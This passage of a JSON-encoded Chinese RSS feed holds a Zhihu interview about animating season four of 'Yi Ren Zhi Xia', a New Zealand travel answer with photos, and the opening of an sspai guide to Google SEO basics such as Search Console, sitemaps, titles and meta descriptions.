05:36:31","description":"\n<p><b>1、《一人之下》第四季有大量新角色登场，能不能和大家分享一下，第四季在人物刻画上有没有什么特别的考量？</b></p>\n<p>感谢知乎的邀请。《一人之下》被粉丝喜爱的因素有很多，群像化式的杰出人物塑造是其中很重要的一点。《碧游村篇》部分的一大特点就是人物个性十分丰富，各类人设（包括龙套）总数超过70+。</p>\n<p> 所以我们在做的时候一个是尽量还原漫画，二是尽可能给角色加上表情细节。动画是动态的，需要把握角色并补完他状态之间的空白。因此，在刻画上表演上，我们尽量做到克制，不使人物偏离形象。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fac0392fc81acbcd20489acad87f2897_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1200\" data-rawheight=\"449\" data-watermark=\"watermark\" data-original-src=\"v2-fac0392fc81acbcd20489acad87f2897\" data-watermark-src=\"v2-465de15f05184b91f662fae84cd16c5d\" data-private-watermark-src=\"v2-fbee35a09aab0c3e379be75ae1a4b0e0\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-09e29c29746c1e24f2c1d35a3309a838_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"804\" data-watermark=\"watermark\" data-original-src=\"v2-09e29c29746c1e24f2c1d35a3309a838\" data-watermark-src=\"v2-cb6e1929b6ebc95a48ec904a25b97f6b\" data-private-watermark-src=\"v2-49dbe61f713ed381b316c1e5e84e78e8\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-965742c6d30e8897df92ea4be9a705df_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1200\" data-rawheight=\"523\" data-watermark=\"watermark\" data-original-src=\"v2-965742c6d30e8897df92ea4be9a705df\" data-watermark-src=\"v2-fcdd33f96b3bd4be3ba781da42871ee3\" data-private-watermark-src=\"v2-fb55cf55efe935444fb9bbb1c8d921c2\"></p>\n<p><b>2、在第四季中，大家对文戏非常期待，请问您是如何处理文戏部分的呈现的呢？</b></p>\n<p>本季最大的难点主要还是控制节奏。</p>\n<p>《碧游村篇》中有大量的叙述，此外，时间和空间的跨度也很广，同时角色引伸的潜台词也相当丰富。如果完全展现这些庞大的对白，一个是现在的时长恐怕很难撑住，第二个是独白和概念阐述的部分会非常非常的长。对此，我们认真做了案头工作，对部分文戏做了部分删减和重组，保证在不影响原内容的情况下使观影节奏更舒服一些。</p>\n<p><b>3、在《一人之下》第四季的制作中有没有遇到过瓶颈？又是如何克服的呢？</b></p>\n<p> 一定要说的话时间永远是瓶颈，这一点永远在克服。</p>\n<p>此外尺度的拿捏是很大的困难，完全不讲和照着漫画原样画出来都是不行的，只能想办法折中。</p>\n<p><b>4、《一人之下4》对楚岚的塑造，有哪些特别之处？</b></p>\n<p>张楚岚是我非常喜欢的角色，在造型上还是以保持漫画形象为第一优先。相对的，在性格上，张楚岚本季的表现的更成熟些。他的身份比起第2季开篇有一个巨大的转变，从“不摇碧莲”升级为了“操刀鬼”，外放性格收敛了许多，更多体现在对局势的判断上。</p>\n<p> 这一点上，我们在开篇做了重点处理，包括他发现本次任务是“来对了”，他发现的契机、微表情，我们都做了重点刻画。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-56b32e5faf7409ab64f09f0ca0007a87_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1200\" data-rawheight=\"461\" data-watermark=\"watermark\" data-original-src=\"v2-56b32e5faf7409ab64f09f0ca0007a87\" data-watermark-src=\"v2-d0fe76e0bbc5c0c99c9b8d877a799e42\" data-private-watermark-src=\"v2-c6746be0d7a45b15fad9a55ade44b5f6\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-f88e91c732123e88b0003fe47371075d_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1840\" data-rawheight=\"787\" data-watermark=\"watermark\" data-original-src=\"v2-f88e91c732123e88b0003fe47371075d\" data-watermark-src=\"v2-8810ca0af5cc43b9e15e073aa5cc1b2b\" data-private-watermark-src=\"v2-a52a07bd48f5f542c3414d0b07f133ce\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-e0ea7a2aae8c413a8c368a5e0ac0a59f_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"804\" data-watermark=\"watermark\" data-original-src=\"v2-e0ea7a2aae8c413a8c368a5e0ac0a59f\" data-watermark-src=\"v2-dfcd10f315a02ccc4906b8e031f5dd40\" data-private-watermark-src=\"v2-f07d1762cb30471cd59386c604ed8fcd\"></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/shi-yi-14-51-37?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">十一</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/488660280/answer/2137142211?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">261 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/478184101?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">《一人之下》发布第四季动画预告，你有什么期待？</a><br><a href=\"http://www.zhihu.com/question/488694658?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《一人之下》动画第四季第一集？</a><br>\n","link":"http://www.zhihu.com/question/488660280/answer/2137142211?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"哪次旅行让你感受到了宁静忘我的瞬间 ？","date":"2021-09-24 05:34:26","description":"\n<p>一辈子都会记得，在新西兰福克斯冰川小镇，坐在雪山湖泊边的那几分钟。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-e0fcef08dbd32ddb51f17585d698bee2_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-e0fcef08dbd32ddb51f17585d698bee2\" data-watermark-src=\"v2-f94d43ded7b974c1f6e71147b206ff23\" data-private-watermark-src=\"v2-261e087f77521b5dd9f9d46785882311\"></p>\n<p>照片没能拍出眼睛看到的画面。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7c56dcf74373ab9d0f3e0a7110779644_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-7c56dcf74373ab9d0f3e0a7110779644\" data-watermark-src=\"v2-539db26d0b782b670aa37839502ed068\" data-private-watermark-src=\"v2-81e8391188ae589480b1658ba8b3149b\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d7fb61e2d0860bed20ee5eceeca2d5f9_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-d7fb61e2d0860bed20ee5eceeca2d5f9\" data-watermark-src=\"v2-b8255f1ea7df5bec505b35a578b36a82\" data-private-watermark-src=\"v2-fb99e0b3086eaac81aba6883bc07e890\"></p>\n<p>真的像画，不仅仅是因为美，还因为静，到极致的那种静，有种神圣感。湖面几乎没有一丝波澜，所以这个湖被当地人叫「镜子湖」。</p>\n<p>需要从福克斯冰川小镇开车到一个徒步路线的入口，在原始森林里走上半个小时才能到。当你一直在视线狭窄的森林里穿行，突然拐个弯，这片湖就出现了。</p>\n<p>看到的时候，轻轻的哇了一声之后就再也不敢出声。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ef3b60f80dec2823342ddec2bbcb4a7f_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-ef3b60f80dec2823342ddec2bbcb4a7f\" data-watermark-src=\"v2-053e19b11b0b771d82c634b50b4cb391\" data-private-watermark-src=\"v2-66a60cd4d3537b9763bb60bca0ca6df6\"></p>\n<p>雪山、巍然不动的松树、没有一丝波澜的平静湖面，这个组合给人一种神圣感。周围的游客全都安静的坐着，有的安静的看，有的安静拍照，要说话也是超级轻声的耳语。</p>\n<p>后来回想，面对湖的那一刻，什么都没想，完全沉浸在自然中放空，感觉特别美妙。</p>\n<p>新西兰南岛真的是值得一去的地方。另一个宁静忘我的瞬间也是那里：米尔弗峡湾。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-bdbdc2d8f0b0231640514f2dcf2f28f2_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"652\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-bdbdc2d8f0b0231640514f2dcf2f28f2\" data-watermark-src=\"v2-1b56a8c22f83b00bdfbce1d9b97d9ea7\" data-private-watermark-src=\"v2-f7b77dd9821d2fee4f510aa4c7aaeb74\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-bb1a927c6e3201e0c1976656eed83b1e_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"960\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-bb1a927c6e3201e0c1976656eed83b1e\" data-watermark-src=\"v2-6380ca97b752e15e912b9661f8d86eca\" data-private-watermark-src=\"v2-3a4e9ec8cff494dd1fa13afe34fe2f9f\"></p>\n<p>到这个地方，船会停下来几分钟，这几分钟大家也都自发的不出声，一起感受自然的神圣美好。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6c20e8fc4ff9c987f600103bc88202f2_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"960\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-6c20e8fc4ff9c987f600103bc88202f2\" data-watermark-src=\"v2-3f2aff7876ea0a09fd7cee45b5722b36\" data-private-watermark-src=\"v2-9f0958b339ec9dc61e49fa5ac7454bf2\"></p>\n<p>有一次突然听到巴赫的【哥德堡变奏曲】，就想，下次一定会带到米尔弗峡湾，在甲板上，带上耳机听一次。</p>\n<p>超美的瓦纳卡湖边的教堂。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-3ffed61664b71bcbff753e0cae467cab_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-3ffed61664b71bcbff753e0cae467cab\" data-watermark-src=\"v2-2898aa0f014fb7f8db2ca10efd372d64\" data-private-watermark-src=\"v2-7f0663f85b7c3e27ea95ebfb1592b3ba\"></p>\n<p>晚上的教堂也像童话。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-8bf7dbcc419648f881b56041cb3992d8_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-8bf7dbcc419648f881b56041cb3992d8\" data-watermark-src=\"v2-8f7e9dc332fff7ddea182bf0b0bbaa09\" data-private-watermark-src=\"v2-78e679dff87e111f33e8dc1c91ff1402\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-bfa3c4821977c5f85db6ddaf484cd570_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-bfa3c4821977c5f85db6ddaf484cd570\" data-watermark-src=\"v2-03c530e8ddc57c5b507435bb813a4ec1\" data-private-watermark-src=\"v2-4ba7d55977533c35afd4baa10298ab9e\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-8b02128bccf9bb70bb2dbc736abe82c9_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-8b02128bccf9bb70bb2dbc736abe82c9\" data-watermark-src=\"v2-b658b94b7e8980dcd4919f2c50099134\" data-private-watermark-src=\"v2-05b0183a970d5643eb1b19d6024aa580\"></p>\n<p>看美景看嗨的两个人。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-82308d7b023be3fdc2182a1f286d7942_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-82308d7b023be3fdc2182a1f286d7942\" data-watermark-src=\"v2-cc4def93ae8ce72cebc5314d6c897219\" data-private-watermark-src=\"v2-0926b3fdaa62c61937541eb849497af8\"></p>\n<p>路上遇见的火烧云。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-4cce1f9302338cea8d4291838b55efc3_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-4cce1f9302338cea8d4291838b55efc3\" data-watermark-src=\"v2-4cf1eed249cbb3cdd3fd2cbfaf7f885b\" data-private-watermark-src=\"v2-c59ee7f85bfdfabd1cd02474d75b9e12\"></p>\n<p>阿司匹林国家公园附近的一条河。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-37af94e5d88e40fa48cc5ea31206b257_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"844\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-37af94e5d88e40fa48cc5ea31206b257\" data-watermark-src=\"v2-80513dce7b5f161d992cb3aac1b0f4f4\" data-private-watermark-src=\"v2-cefb463cc1eacdad030478c6c0e364d5\"></p>\n<p>普卡基湖。</p>\n<p>颜色太不真实了，也在湖边安静的坐了一下午。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-39530f48e83acca3c90446f91f795060_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-39530f48e83acca3c90446f91f795060\" data-watermark-src=\"v2-ea567e9b8f8dd46a9f0e592785851e5a\" data-private-watermark-src=\"v2-8875ff6e69c27e5af3f354d4e2d9d3e9\"></p>\n<p>但尼丁也是一个超棒的城市。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-104ecd6c9f95ff0e466a29fe4b5551da_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-104ecd6c9f95ff0e466a29fe4b5551da\" data-watermark-src=\"v2-8c92ffa9df6c4713f0717350611ab64f\" data-private-watermark-src=\"v2-7e00c83031e84a82078241b24a1ca35b\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-2b790d02598556c4fb00cc7da03f9710_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-2b790d02598556c4fb00cc7da03f9710\" data-watermark-src=\"v2-879b89f36b0e9855ff7ba09fe710509e\" data-private-watermark-src=\"v2-e5cc9e22f2992058d9930d512460cb62\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-1a0d7be67f2b76b1b7578ac6d7fa8c99_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-1a0d7be67f2b76b1b7578ac6d7fa8c99\" data-watermark-src=\"v2-e335dab60c0bef524f8ac5cab1f2c448\" data-private-watermark-src=\"v2-d1dc5c3610d1f88f759753755341fe9a\"></p>\n<p>已经忘了是哪条公路上突然遇见的湖，好喜欢！！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6d9f747287fb685123e5666533224d6f_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-6d9f747287fb685123e5666533224d6f\" data-watermark-src=\"v2-a229cb239b1ea5150cac013383b0bb92\" data-private-watermark-src=\"v2-b8263385411c7109fdcdb2840cd6092a\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-54dabf11c32de94ce118f5b2499300b7_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-54dabf11c32de94ce118f5b2499300b7\" data-watermark-src=\"v2-a229cb239b1ea5150cac013383b0bb92\" data-private-watermark-src=\"v2-b8263385411c7109fdcdb2840cd6092a\"></p>\n<p>自驾的路途中，真的惊喜不断！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-f2b934cd0fdf5c94c4460bdecb046004_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-f2b934cd0fdf5c94c4460bdecb046004\" data-watermark-src=\"v2-f89a311a06e61e8522e08052ef729ee8\" data-private-watermark-src=\"v2-e974b4b9d3197ce12507e1c59b4cdb3b\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-35c1d0cf36f9225f645771c6a8cd1dff_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-35c1d0cf36f9225f645771c6a8cd1dff\" data-watermark-src=\"v2-3973bc6d5ee9d0dddfcb39de41b8757c\" data-private-watermark-src=\"v2-d0963ac08c17f4a19805cea6b4fecec8\"></p>\n<p>太爱新西兰了！！以后还会带小皮皮一起去。</p>\n<p><a class=\"member_mention\" href=\"http://www.zhihu.com/people/614f573dea8647f30ed0bcfc03866e3a\" data-hash=\"614f573dea8647f30ed0bcfc03866e3a\" data-hovercard=\"p$b$614f573dea8647f30ed0bcfc03866e3a\">@知乎旅行</a> </p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/pi-pi-de-dan-dan-66?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Bonnie的小皮皮</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/488115650/answer/2137136569?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">165 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/420672289?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如果让你选择去一个地方旅行，并在那里工作生活，你最想去哪里？</a><br><a href=\"http://www.zhihu.com/question/420863560?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">旅行在你们生活中的意义是什么？</a><br>\n","link":"http://www.zhihu.com/question/488115650/answer/2137136569?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"搜索排名靠前的网站一定给了钱？从 SEO 了解为什么你会看到这些网站","date":"2021-09-24 03:39:58","description":"\n<p><strong>Matrix 首页推荐</strong></p>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<h2>写在前面</h2>\n<p>由于工作需要，我开始研究搜索引擎优化（也就是 Search Engine Optimization），其实这个课题本来分为两部分——SEO 和 SEM（Search Engine Marketing）。一般来说，SEM 特指以付费广告的形式进行网站引流的工作，也就是通过 Google Ads 做付费的引流，不是本文讨论的范畴。<strong>本文讨论主要通过技术手段和内容优化达到在 Google 搜索引擎自然排名提升的效果，</strong>当然也有可能会有付费工具，但本质思路不是通过直接买流量获得转化。</p>\n<p>虽然本文是中文内容，但讨论的主题是基于 Google 的搜索引擎优化，当然很多内容也适应 Bing 搜索，百度应该也是可以吧。在重度使用 Google 和 Bing 搜索的近一年中，确实感受到了不同搜索引擎的特点，现在偶尔使用百度搜索还是很不适应，广告太多，而且具有欺骗性，自然排名质量也不高，经常搜到来自知乎和搜狐的低质量内容。Google 和 Bing 相对好一些——广告标注清晰，界面简洁易用，搜索结果质量都不错，问答知识类内容结果都有深度和专业性，能够解决用户的问题。</p>\n<p>本文是相对初级地介绍 Google 搜索引擎的逻辑和提高搜索结果的方法，具有一定实操性，可以帮助你解决一些困惑。由于一些原因，本文有些外网链接可能打不开，作者表示抱歉。</p>\n<h2>前提：你的网站是否被 Google 索引</h2>\n<h3>Google 是否抓取你的站点</h3>\n<p>如果你新建了一个站点——无论通过 Shopify 还是 WordPress 等等——Google 收录站点需要一些时间，Google 文档没有给出具体的时间长度，只是说明了没有被抓取的原因，我们可以根据这些原因分析问题出在哪里。</p>\n<ul><li><a href=\"https://developers.google.com/search/docs/basics/get-on-google\" target=\"_blank\">传送门：你的站点没有被 Google 抓取的原因</a></li></ul>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/21/article/fa6a1e213bf7a9ab816a0e65aee012a8\"><figcaption>部分内容截图</figcaption></figure><h3>检验方法</h3>\n<p>在 Google 搜索中直接搜索 <code>site:xxx.com</code>，如果没有任何结果，说明尚未收录。举个例子：在Google搜索框中输入 <code>site:liangxile.icu</code>。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/21/article/6c4508f1a72e4145807f7d00ea12eefa\"></figure><p>这样就是网站并没有被 Google Bot 抓取到，需要手动在 Google search console 里添加网站信息，这样才会更容易被抓取从而在搜索的时候有可能现在显示在 <a href=\"https://zh.wikipedia.org/wiki/%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C%E9%A1%B5\" target=\"_blank\">SERP（维基百科）</a>（search engine result page）Google 的搜索结果页。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/21/article/58751a66435634c55501c906eabbe530\"></figure><p>而如果搜索结果可以显示网站链接那就说明抓取成功，可以进行 SEO 优化。当然也可以在 Google 搜索中测试几个与站点相关的关键词，看看网站的排名如何，不过绝大多数网站在建站之初是很难在前 30 页中找到的，除非你的站点确实做了 SEO 优化并上传了和优质的内容，或者你搜索的关键词是相对唯一确定的，否则像「<a href=\"https://www.google.com/search?q=%E8%A1%A3%E6%9C%8D&amp;sxsrf=AOaemvLVHzubgvGfnl_WsForP-OJ_B0pNQ%3A1632110097243&amp;ei=EQZIYa2ZDsuA8gLEj50g&amp;oq=%E8%A1%A3%E6%9C%8D&amp;gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAzIFCAAQgAQyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEMgUIABCABDIICAAQgAQQiwM6BwgjEOoCECc6CggjEOoCECcQiwM6BAgjECc6BAgAEENKBAhBGAFQ3uYcWN6AHWD9hh1oAnAAeASAAeoCiAGYFJIBAzMtOJgBAKABAbABCrgBA8ABAQ&amp;sclient=gws-wiz-serp&amp;ved=0ahUKEwjt5dH004zzAhVLgFwKHcRHBwQQ4dUDCA4&amp;uact=5\" target=\"_blank\">衣服</a>」这种很广泛的关键词会导致你的网站排名在 50 页开外，注意是「页」还不是「条」。</p>\n<h3>添加站点地图到 <a href=\"https://zh.wikipedia.org/wiki/Google%E7%B6%B2%E7%AB%99%E7%AE%A1%E7%90%86%E5%93%A1\" target=\"_blank\">GSC（维基百科）</a>（Google search console）</h3>\n<h4>确保站点 SSL 证书</h4>\n<p>由于这几年人们越来越在意网站的安全性，所以起初的 HTTP 协议已不能保证我们点击链接的安全性，所以就有了 HTTPS。简单讲，就是有 HTTPS 的网站更安全，地址栏也会有个锁子的图标。而在点击没有 HTTPS 的网站时大多数主流的 <a href=\"https://gs.statcounter.com/\" target=\"_blank\">浏览器</a> 都会有安全提示，Google 也明确建议所有网站都使用 HTTPS，所以在 GSC 提交站点地图之前，确保网站已安装 SSL 证书。</p>\n<h4>添加站点地图到 GSC</h4>\n<p>首先，如果你的网站是 WordPress、Wix 或者 Blogger 等 CMS 内容管理平台，可以不用单独在 GSC 添加站点地图，平台会自动添加。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/21/article/ea86b8b7f359493f8a9b9ae89e318dc2\"><figcaption>Google 对于站点地图的说明</figcaption></figure><p>其次，如果你是 Shopify 商店的付费用户，那么 Shopify 会为你自动生成站点地图，你只需要将站点地图添加到 GSC 的站点地图一栏就行。</p>\n<ul><li><a href=\"https://help.shopify.com/zh-CN/manual/promoting-marketing/seo/find-site-map\" target=\"_blank\">传送门：Shopify 的相关教程</a></li></ul>\n<p>最后，其它更复杂的添加方式可以参考 Google 关于 <a href=\"https://developers.google.com/search/docs/advanced/sitemaps/build-sitemap?hl=zh-cn\" target=\"_blank\">创建和提交站点地图</a> 的教程。</p>\n<h3>阻止抓取隐私内容</h3>\n<p>网站如果有隐私内容，可以通过 robot.txt 来阻止 Google 的抓取，<a href=\"https://developers.google.com/search/docs/advanced/robots/intro?hl=zh-cn\" target=\"_blank\">点击这里</a> 可以查看使用方法。</p>\n<h2>帮助 Google（和用户）了解网站内容</h2>\n<h3>检查网站的内容</h3>\n<p>通过在 GSC 的网站检查一栏对你站点的每一个页面进行检查，确保 Google 看到的页面和用看到的页面是一样或者没有太大偏差的，也就保证我们针对网站的优化是可以被直接反馈的。当然，网站检查的前提是已在 GSC 添加站点并验证域名。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/21/article/5b9f787eb909a73979a3d0c28bd1f857\"></figure><p>我们可以根据检查结果对我们的网站进行优化。</p>\n<h3>确保网站中的网页标题简单准确</h3>\n<p>网站的标题的字符数并不是越多越好，不意味着你在标题里埋的关键词都会是你的排名更靠前。标题不光是要写给搜索引擎看的，用户也需要能明白标题的含义。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/21/article/dee960ccdb91c6b0f1ef7b881c3f8bd5\"></figure><p>我们通过这样一个方法来佐证我们标题字符数量：在 Google 中搜索与你当下页面内容最核心的关键词，排除带有「ads」标志的广告，看一下前两页的自然搜索排名中每个结果标题的字符数量取个平均值，那么我们要做的是<strong>取平均值的 110% 长度，并避免最核心的关键词出现在后 20% 的长度而被折叠</strong>。这是我正在使用的方法，推荐给你。</p>\n<p>当然，各平台的第一方建议也是值得参考的，比如 Shopify 在搜索引擎优化的标题建议字符数是 70 个。</p>\n<h4>要避免的做法</h4>\n<ol>\n<li>选择与网页内容无关的标题</li>\n<li>为网站的所有页面或大量页面使用同一个标题</li>\n<li>使用对用户来说不实用的冗长标题。</li>\n<li>在 title 标记中填充不需要的关键字。</li>\n</ol>\n<h3>Meta Description——网站的摘要</h3>\n<p>Meta Description 是显示在搜索结果的页的网站链接摘要，他可以帮助解释这条链接的主要内容，会促进链接的点击率。可以肯定的是 Meta Description 不会直接帮助我们在 Google 搜索排名中获得更靠前的位置，因为早在 2009 年 <a href=\"https://developers.google.com/search/blog/2009/09/google-does-not-use-keywords-meta-tag\" target=\"_blank\">Google 在确定网页排名时不会考虑 keywords 元标记</a>，但是更有吸引力的 Meta Description 会提高我们链接的点击转化率，也就是说 Meta Description 是写给用户看的。</p>\n<h4>字符数量</h4>\n<p>同样，我们可以采用 110% 平均法则，并将最核心关键词放在前 80% 避免折叠。另外 Shopify 这里给出的字符数建议是 320 个，仅供参考。</p>\n<p><a href=\"https://themeisle.com/blog/meta-description-examples/\" target=\"_blank\">一项关于 Meta Description 研究</a> 显示，<strong>160 个字符左右是比较合适的，</strong>这个研究统计了 15 家公司在 Google 搜索结果页的 Meta Description，基本都少于 160 字符。</p>\n<h4>如何快速写摘要</h4>\n<ol>\n<li>把 keywords 埋在自然语言中，保持语句通顺</li>\n<li>确保向用户传递价值</li>\n<li>加入 Call-to-action 的字样，比如「了解更多」</li>\n<li>不要偏离网页主题</li>\n<li>每个网页采用独立的 Meta Description，不要重复。</li>\n</ol>\n<h4>要避免的做法</h4>\n<ol>\n<li>编写与网页内容无关的 description 元标记。</li>\n<li>使用「这是一个网页」或「与棒球卡相关的网页」等通用说明。</li>\n<li>仅使用关键字填写说明。</li>\n<li>将整个文档复制并粘贴到 description 元标记中。</li>\n<li>为网站所有网页或大量网页使用同一个 description 元标记。</li>\n<li>在标题标记中放置对定义网页结构无用的文字。</li>\n<li>在更适合使用 &lt;em&gt; 和 &lt;strong&gt; 等其他标记的地方使用标题标记。</li>\n<li>毫无规律地使用不同长度的标题标记。</li>\n<li>在网页上过度使用标题标记。</li>\n<li>标题过长。</li>\n<li>仅出于为文字添加样式（而非为了呈现结构）的目的使用标题标记。</li>\n</ol>\n<h3>添加结构化数据标记</h3>\n<h4>HTML 代码标记</h4>\n<p>以合理的机构化数据标注可以帮助我们的网页在搜索结果页得到更好的显示——</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/21/article/268381a7457e2b0f8822cc1fb543f7ce\"></figure><h4>可以标注的 <a href=\"https://developers.google.com/search/docs/advanced/structured-data/search-gallery?hl=zh-cn\" 